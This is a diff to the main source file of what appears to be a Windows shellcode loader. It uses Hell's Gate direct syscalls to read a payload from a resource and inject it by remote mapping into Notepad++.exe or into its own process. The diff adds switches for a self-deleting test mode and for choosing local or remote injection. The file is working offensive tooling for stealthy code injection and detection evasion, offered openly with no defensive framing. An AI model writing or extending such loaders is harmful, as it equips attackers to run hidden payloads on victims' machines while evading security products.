@@ -1,9 +1,21 @@
 #include "HellsGate.h"
 #include "Common.h"
 
+#define TEST
+
+//#define LOCAL_INJECTION
+
+#ifndef LOCAL_INJECTION
 #define TARGET_PROCESS L"Notepad++.exe"
+#endif
 
 int main() {
+	// Init syscalls for use
+	InitializeSyscalls();
+#ifdef TEST
+	SelfDelete();
+
+#else
 	PVOID pPayloadAddress = NULL;
 	SIZE_T sPayloadSize = 0;
 	DWORD dwPid = 0;
@@ -16,10 +28,14 @@ int main() {
 	}
 	printf("[+] Read Payload To: %p Address Of Size: %d\n", pPayloadAddress, (INT)sPayloadSize);
 	PrintHexData("ResourcePayload", pPayloadAddress, sPayloadSize);
-
-	// Init syscalls for use
-	InitializeSyscalls();
-
+#ifdef LOCAL_INJECTION
+	RemoteMappingInjectionViaSyscalls(
+		GetCurrentProcessHandle(),
+		pPayloadAddress,
+		sPayloadSize,
+		TRUE
+	);
+#else
 	// Process enumeration
 	printf("[i] Enumerating Processes...\n");
 	if (GetRemoteProcessHandle(TARGET_PROCESS, &dwPid, &hProcess) != TRUE) {
@@ -29,20 +45,13 @@ int main() {
 	printf("[+] DONE!\n");
 	wprintf(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
 
-	// Executing payload on the local process
-	//RemoteMappingInjectionViaSyscalls(
-	//	GetCurrentProcessHandle(),
-	//	pPayloadAddress,
-	//	sPayloadSize,
-	//	TRUE
-	//);
-
 	RemoteMappingInjectionViaSyscalls(
 		hProcess,
 		pPayloadAddress,
 		sPayloadSize,
 		FALSE
 	);
-
+#endif
+#endif
 	return 0;
 }
